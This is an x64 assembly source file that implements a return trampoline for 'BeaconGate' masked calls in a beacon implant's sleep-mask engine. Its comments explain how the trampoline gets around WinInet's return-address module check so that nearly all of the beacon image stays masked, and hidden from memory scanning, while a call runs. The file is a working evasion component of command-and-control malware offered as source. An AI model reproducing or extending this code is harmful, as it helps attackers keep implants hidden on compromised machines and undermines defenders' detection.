; gate_tramp.asm - return trampoline for BeaconGate's masked calls (x64 MASM)
;
; A callee may resolve its caller by return address. WinInet does - it hands
; the address to GetModuleHandleEx(FROM_ADDRESS) -> RtlPcToFileHeader, which
; on current Windows only resolves image mappings. The mask engine's stubs
; (sleepmask_bofwin.cpp) live on a private page, so a call made from there
; resolves to nothing and InternetOpenA hands back a bogus handle. A masked
; call therefore returns HERE first - 16 bytes of executable section inside
; the beacon image - and jumps on to the stub:
;
;   gated_tramp:    jmp qword ptr [gated_target]
;   gated_target:   dq <stub page: the call thunk's `after`>
;
; sleepmask_bofwin.cpp fills gated_target at engine build and keeps this
; section out of the mask. Nothing else lives in the section, so nothing of
; the beacon but these 16 bytes is in the clear while a gated call runs.

gtramp SEGMENT ALIGN(16) 'CODE'

PUBLIC  gated_tramp
gated_tramp PROC
        jmp     qword ptr [rip + gated_target]
gated_tramp ENDP

PUBLIC  gated_target
ALIGN   8
gated_target DQ 0

gtramp ENDS

END
